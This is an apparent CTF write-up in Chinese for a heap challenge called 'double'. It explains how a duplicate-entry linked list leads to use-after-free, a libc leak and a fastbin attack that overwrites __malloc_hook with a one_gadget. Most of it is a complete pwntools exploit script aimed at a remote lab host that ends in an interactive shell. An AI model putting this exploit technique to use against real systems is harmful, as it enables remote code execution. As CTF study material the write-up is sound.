

看了恒哥逆的ida，加上自己理解了一些，程序就变得很简洁明了了。

大体是一个单向链表，当加入数据与链表头相同时，会偷懒不新建，直接沿用链表头malloc的数据，但是重新赋予序号。不妨设有这样两个相同，序号分别为AB。这就导致删除序号A后，对B修改可以直接修改堆，也可以再删除，存在uaf

泄露地址就用删除掉的A，打印B即可。

利用fastbin attack可以很快速的getshell。

然后直接把malloc_hook改成one_gadget就可以了。

如果想用realloc_hook怕strncpy截断，就用edit函数里面的memcpy来解决。

```python
from pwn import *

debug = 0
if debug:
	p = process('./double')
else:
	p = remote('e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com',40002)

e = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context(log_level = 'debug')

def add(msg):
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('data:')
	p.send(msg)

def show(idx):
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil('index: ')
	p.sendline(str(idx))

def edit(idx, msg):
	p.recvuntil('>')
	p.sendline('3')
	p.recvuntil('index:')
	p.sendline(str(idx))
	sleep(0.01)
	p.send(msg)

def delete(idx):
	p.recvuntil('>')
	p.sendline('4')
	p.recvuntil('index:')
	p.sendline(str(idx))

add('a'*0x200+'\n')#0
add('a'*0x200+'\n')#1
delete(0)
show(1)
#p.recvuntil('')
libc_base = u64(p.recv(6).ljust(8, '\x00')) - 0x3c4b78
print hex(libc_base)

one = libc_base + 0x4526a
malloc_hook = libc_base + e.symbols['__malloc_hook']
realloc = libc_base + 0x846C0 

notelen = 0x67

#gdb.attach(p, 'b* 0x401288\nb* 0x40144E')

add('b'*notelen+'\n') #2
add('b'*notelen+'\n') #3
add('d'*notelen+'\n') #4
add('c'*notelen+'\n') #5
delete(2)
edit(3, p64(malloc_hook-0x23)+'\x00'+'\n')
print hex(malloc_hook)

#gdb.attach(p, 'b* 0x401288\nb* 0x40144E')
add('b'*notelen+'\n') #6
print hex(realloc)
print hex(one)
add(('e'*19+p64(one))+'\x00'*(notelen-11-16)+'\n') #7
#edit(7, 'e'*11+p64(one)+p64(one)+'\x00'*10+'\n')

#gdb.attach(p, 'b* 0x401288\nb* 0x40144E')

p.recvuntil('>')
p.sendline('1')

p.interactive()

```

